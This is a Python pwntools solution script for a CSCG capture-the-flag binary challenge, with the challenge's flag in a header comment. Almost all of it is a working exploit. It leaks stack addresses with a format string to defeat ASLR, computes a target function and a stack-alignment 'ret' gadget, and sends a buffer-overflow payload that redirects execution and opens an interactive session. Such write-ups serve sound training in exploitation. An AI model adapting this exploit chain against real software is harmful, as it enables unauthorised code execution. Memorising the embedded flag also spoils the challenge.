#!/usr/bin/env python3
#CSCG{NOW_PRACTICE_EVEN_MORE}
#python3 solution.py

from pwn import *

format_string = " | ".join(["%p" for _ in range(0,40)])
target_offset = 0x135
ret_offset = 0x290
expected = b"Expelliarmus"
null_byte = b"\x00" # to validate the strcmp

p = remote("7b000000cfe99a2556654c24-intro-pwn-1.challenge.broker.cscg.live", 31337, ssl=True)
#p = process("./pwn1")
#raw_input("attach gdb")

p.recvuntil("Enter your witch name:")
p.sendline(format_string)

leaks = p.recvuntil("enter your magic spell:")  # return bytes
leaks = leaks.decode().split(' | ')   # convert byte to string
print("leaked address: ",leaks[-2]) # to defeat ASLR

target_address = int(leaks[-2], 16) - target_offset
print("target address: ",hex(target_address))

# extra_ret can points to any 'ret' instruction. The idea is to align the rsp to multiple of 16B, so that new stack frame i.e. stack frame of target function aligned correctly.
# hence, first address to 'ret' is added so that it again pop/rip the next stored address in the stack. 
# this next address will point to correct target address and now rsp is also a muliple of 16B.
extra_ret = int(leaks[-2], 16) - ret_offset  #pointing to 'ret' in deregister_tm_clones() 
print("extra return address: ",hex(extra_ret))

pad = b'A' * cyclic_find("cnaa") #cyclic(512)
payload = expected + null_byte + pad + p64(extra_ret) + p64(target_address)
print(payload)
p.sendline(payload)

p.interactive()

